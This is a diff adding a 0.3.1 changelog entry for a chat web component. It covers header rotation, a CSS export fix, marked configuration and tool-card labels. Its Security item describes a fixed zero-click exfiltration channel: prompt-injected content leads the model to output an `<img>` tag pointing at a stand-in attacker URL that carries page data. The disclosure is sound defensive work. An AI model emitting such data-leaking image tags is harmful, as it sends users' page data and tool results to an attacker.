@@ -7,6 +7,47 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.3.1] — 2026-06-10
+
+### Security
+
+- **`<img>` is stripped from rendered assistant markdown by default.** A
+  model-controlled `<img src="https://attacker/?d=...">` is fetched by the
+  browser with no user interaction, which made the sanitizer allowlist a
+  zero-click exfiltration channel for prompt-injected page data (page maps,
+  state hooks, tool results). Hosts that trust their content can opt back in
+  via the new `allowImages` element property (or `renderMarkdown(text,
+  { allowImages: true })`); when enabled, DOMPurify still strips event
+  handlers and `javascript:` URLs as before.
+
+### Fixed
+
+- **Rotated headers now reach the agent stream.** `HttpAgent` is built once
+  per conversation with the headers baked into its constructor, so a rotated
+  token (CSRF, short-lived JWT) never reached the agent endpoint and long
+  sessions 401'd mid-conversation — even though the skills/tools catalog
+  fetches already re-read `headers` per request. The element now passes a
+  live `getHeaders` callback to the agent factory and `createHttpAgent`'s
+  fetch wrapper overlays the fresh values on every request. Custom
+  `agentFactory` implementations can read the new optional
+  `HttpAgentOptions.getHeaders` to do the same.
+- **Removed the phantom `./style.css` export.** `package.json` advertised
+  `@artooi/ag-ui-web-component/style.css` → `dist/ag-ui-web-component.bundle.css`,
+  but the build emits no CSS file (styles live as JS strings and are injected
+  into the Shadow DOM), so importing the advertised path always failed.
+- **The shared `marked` singleton is no longer mutated.** Module-scope
+  `marked.setOptions({ gfm, breaks })` clobbered a host app's `marked`
+  configuration whenever the dependency was deduped. Rendering now uses a
+  local `Marked` instance; the global keeps its defaults.
+
+### Added
+
+- **Auto-prettified tool-card labels.** When no label is found anywhere in
+  the chain (`x-summary` → `toolSummaries` → fetched `data-tools-url`
+  catalog), cards now fall back to a prettified name (`list_projects` →
+  "List projects") instead of the raw identifier. Exported as
+  `prettifyToolName`.
+
 ## [0.3.0] — 2026-06-03
 
 ### Added
@@ -172,7 +213,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ### Notes
 - First release — exercising the automated npm OIDC publish pipeline end-to-end.
 
-[Unreleased]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.0...HEAD
+[Unreleased]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.1...HEAD
+[0.3.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.0...v0.3.1
 [0.3.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.2...v0.3.0
 [0.2.2]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.1...v0.2.2
 [0.2.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.0...v0.2.1
